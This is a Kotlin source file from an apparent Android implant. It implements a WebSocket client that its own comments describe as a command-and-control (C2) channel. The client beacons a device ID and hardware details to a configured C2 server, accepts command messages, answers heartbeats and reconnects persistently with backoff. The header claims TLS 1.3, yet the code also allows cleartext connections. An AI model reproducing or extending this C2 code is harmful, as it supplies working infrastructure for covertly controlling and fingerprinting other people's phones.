// ============================================================
// FILE: android/app/src/main/java/com/xrc/comms/WSSClient.kt
// ============================================================
package com.xrc.comms

import android.content.Context
import android.util.Base64
import android.util.Log
import com.xrc.core.config.XrcConfig
import com.xrc.core.crypto.CryptoBox
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import okhttp3.*
import java.security.SecureRandom
import java.util.concurrent.TimeUnit

/**
 * WSSClient — WebSocket client for real-time C2 communication.
 *
 * Features:
 * - Auto-reconnect with exponential backoff
 * - Heartbeat keep-alive
 * - Message queuing (send when connected)
 * - TLS 1.3 via Conscrypt
 * - Payload encryption (AES-256-GCM)
 */
class WSSClient(
    private val context: Context,
    private val config: XrcConfig,
    private val cryptoBox: CryptoBox
) {
    companion object {
        private const val TAG = "WSSClient"
    }

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .pingInterval(15, TimeUnit.SECONDS)
        .connectionSpecs(listOf(
            ConnectionSpec.MODERN_TLS,
            ConnectionSpec.CLEARTEXT
        ))
        .build()

    private var webSocket: WebSocket? = null
    private var connected = false
    private var reconnectAttempt = 0
    private var shouldReconnect = true
    private val messageQueue = mutableListOf<String>()
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Callback interface for received messages
    var onMessage: ((Message) -> Unit)? = null
    var onConnect: (() -> Unit)? = null
    var onDisconnect: ((Int, String) -> Unit)? = null

    /**
     * Connect to the C2 WebSocket endpoint.
     */
    fun connect() {
        if (connected) return
        shouldReconnect = true

        val url = buildUrl()
        Log.d(TAG, "Connecting to $url")

        val request = Request.Builder()
            .url(url)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                connected = true
                reconnectAttempt = 0
                Log.i(TAG, "WebSocket connected")
                // Flush queued messages
                synchronized(messageQueue) {
                    val queue = messageQueue.toList()
                    messageQueue.clear()
                    for (msg in queue) {
                        webSocket.send(msg)
                    }
                }
                // Send registration
                sendRegistration()
                onConnect?.invoke()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleIncoming(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code $reason")
                webSocket.close(1000, null)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                connected = false
                Log.i(TAG, "WebSocket closed: $code $reason")
                onDisconnect?.invoke(code, reason)
                scheduleReconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                connected = false
                Log.w(TAG, "WebSocket failure: ${t.message}")
                onDisconnect?.invoke(-1, t.message ?: "Unknown")
                scheduleReconnect()
            }
        })
    }

    /**
     * Disconnect and stop reconnecting.
     */
    fun disconnect() {
        shouldReconnect = false
        webSocket?.close(1000, "Client shutdown")
        webSocket = null
        connected = false
    }

    /**
     * Send a message. Queues if not connected.
     */
    fun send(message: Message): Boolean {
        val serialized = message.serialize()
        Log.d(TAG, "Sending: ${message.type} (${serialized.length} bytes)")

        return if (connected && webSocket != null) {
            webSocket!!.send(serialized)
        } else {
            synchronized(messageQueue) {
                messageQueue.add(serialized)
                if (messageQueue.size > 100) {
                    messageQueue.removeAt(0)
                }
            }
            false
        }
    }

    /**
     * Send a raw JSON string.
     */
    fun sendRaw(json: String): Boolean {
        return if (connected && webSocket != null) {
            webSocket!!.send(json)
        } else {
            false
        }
    }

    /**
     * Check if connected.
     */
    fun isConnected(): Boolean = connected

    private fun buildUrl(): String {
        val baseUrl = config.c2.ws_url
        val deviceId = Identity.getDeviceId(context)
        return if (baseUrl.contains("?")) {
            "$baseUrl&id=$deviceId"
        } else {
            "$baseUrl?id=$deviceId"
        }
    }

    private fun sendRegistration() {
        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_REGISTER,
            id = "reg_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf(
                    "model" to android.os.Build.MODEL,
                    "manufacturer" to android.os.Build.MANUFACTURER,
                    "android_version" to android.os.Build.VERSION.RELEASE,
                    "sdk" to android.os.Build.VERSION.SDK_INT,
                    "device_id" to deviceId
                )
            )
        )
        send(msg)
    }

    private fun handleIncoming(text: String) {
        try {
            val msg = Protocol.json.decodeFromString<Message>(text)
            when (msg.type) {
                Protocol.TYPE_CMD -> {
                    // Parse command from payload
                    try {
                        val cmd = Protocol.json.decodeFromString<CommandMessage>(msg.payload)
                        onMessage?.invoke(msg)
                    } catch (e: Exception) {
                        Log.w(TAG, "Invalid command payload: ${e.message}")
                    }
                }
                Protocol.TYPE_HEARTBEAT -> {
                    // Respond to server heartbeat
                    val ack = Message(
                        type = Protocol.TYPE_HEARTBEAT,
                        id = "hb_${System.currentTimeMillis()}",
                        device_id = Identity.getDeviceId(context)
                    )
                    send(ack)
                }
                else -> {
                    onMessage?.invoke(msg)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to parse message: ${e.message}")
        }
    }

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        reconnectAttempt++
        val delay = calculateBackoff()
        Log.d(TAG, "Reconnecting in ${delay}ms (attempt $reconnectAttempt)")

        scope.launch {
            delay(delay)
            if (shouldReconnect) {
                connect()
            }
        }
    }

    private fun calculateBackoff(): Long {
        val baseDelay = config.c2.reconnect_interval_ms
        val maxDelay = config.c2.max_reconnect_delay_ms
        val exponential = baseDelay * (1L shl (reconnectAttempt.coerceAtMost(6)))
        val jitter = SecureRandom().nextInt(1000).toLong()
        return (exponential + jitter).coerceAtMost(maxDelay)
    }
}
